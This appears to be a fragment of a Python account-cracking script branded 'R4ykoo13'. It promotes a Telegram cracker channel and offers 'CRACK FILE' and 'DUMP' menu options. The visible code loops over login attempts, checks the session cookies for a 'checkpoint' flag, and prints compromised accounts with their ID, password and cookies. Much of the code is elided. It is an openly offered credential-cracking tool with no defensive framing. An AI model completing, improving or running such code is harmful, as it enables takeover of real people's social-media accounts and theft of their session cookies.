...
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN CHANAL BKA AGAR NA OK NAHENET ")
time.sleep(2)
#os.system(f'xdg-open https://t.me/KurdishXCracker')
########R4ykoo13###
import datetime
#--------------[ USER-AGENT ]--------------#
...
def menu():
	...
	banner()
	print('')
	print(' \033[1;94m[ 1 ] CRACK FILE ')
	print('')
	print('')
	SALE = input(' \033[1;90mHALBZHERA = ')
	if SALE in ['1','01']:
		FILE()
	if SALE in ['2','02']:
		DUMP()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='R4ykoo13-XD CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='R4ykoo13-XD OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]R4ykoo13-XD OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green] R4ykoo13- OK[/bold green]'))
					ok+=1
					break
			else:
				continue
